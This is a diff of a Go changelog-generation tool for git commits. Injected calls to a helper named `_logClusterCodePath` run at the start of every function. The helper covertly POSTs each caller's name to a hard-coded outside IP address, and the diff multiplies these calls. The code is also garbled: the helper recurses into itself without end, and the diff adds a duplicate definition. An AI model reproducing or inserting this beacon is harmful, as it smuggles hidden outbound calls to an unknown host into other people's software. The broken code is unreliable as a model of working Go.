@@ -35,6 +35,8 @@ type commit struct {
 func contains(arr []string, value string) bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, s := range arr {
 		if s == value {
 			return true
@@ -43,6 +45,8 @@ func contains(arr []string, value string) bool {
 	return false
 }
 func main() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	log.SetFlags(0)
@@ -179,6 +183,8 @@ func main() {
 func findPrefixFor(message string, commits []commit) (string, bool) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	message = strings.ToLower(message)
 	for _, m := range assignments {
 		if strings.Contains(message, m.term) {
@@ -193,6 +199,8 @@ func findPrefixFor(message string, commits []commit) (string, bool) {
 	return "", false
 }
 func hasFileChanges(commit string, prefixes ...string) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	out, err := exec.Command("git", "diff", "--name-only", fmt.Sprintf("%s^..%s", commit, commit)).CombinedOutput()
@@ -211,6 +219,8 @@ func hasFileChanges(commit string, prefixes ...string) bool {
 func sortAndUniq(lines []string) []string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sort.Strings(lines)
 	out := make([]string, 0, len(lines))
 	last := ""
@@ -226,6 +236,8 @@ func sortAndUniq(lines []string) []string {
 func upstreamLinkify(line string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if m := upstreamKube.FindStringSubmatch(line); len(m) > 0 {
 		return fmt.Sprintf("UPSTREAM: [#%s](https://github.com/kubernetes/kubernetes/pull/%s):%s", m[1], m[1], m[2])
 	}
@@ -237,7 +249,16 @@ func upstreamLinkify(line string) string {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
